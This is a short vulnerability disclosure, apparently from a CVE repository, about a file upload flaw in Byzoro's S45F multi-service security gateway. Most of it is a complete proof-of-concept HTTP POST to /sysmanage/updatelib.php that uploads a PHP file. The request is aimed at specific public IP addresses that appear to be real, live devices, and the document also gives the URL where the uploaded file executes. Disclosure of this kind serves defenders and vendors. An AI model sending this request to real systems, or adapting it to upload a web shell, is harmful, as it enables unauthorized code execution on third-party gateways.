Beijing Baizhuo Network Technology Co., Ltd. (hereinafter referred to as Baizhuo Network) is a high-tech enterprise dedicated to building the next generation of secure Internet. Byzro Networks Smart S45F multi-service security gateway intelligent management platform has a file upload vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official：https://www.byzoro.com/

version: S45

Vulnerability Path ：/sysmanage/updatelib.php

Ip：https://103.121.164.62:8443/

poc:

```
POST /sysmanage/updatelib.php? HTTP/1.1
Host: 222.180.2.66:8443
Cookie: PHPSESSID=c36d5527fd784aa29748b3b1c50be7bc
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 715
Origin: https://222.180.2.66:8443
Referer: https://222.180.2.66:8443/sysmanage/licence.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="ck"

radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hid_tftp_ip"


-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hid_ftp_ip"


-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

set
-----------------------------42328904123665875270630079328—

```

https://103.121.164.62:8443/home/phpinfo.php
<img width="602" alt="image" src="https://github.com/llixixi/cve/assets/144869546/64c719d2-cc84-4b41-a61a-3f4d6c6e9a2e">

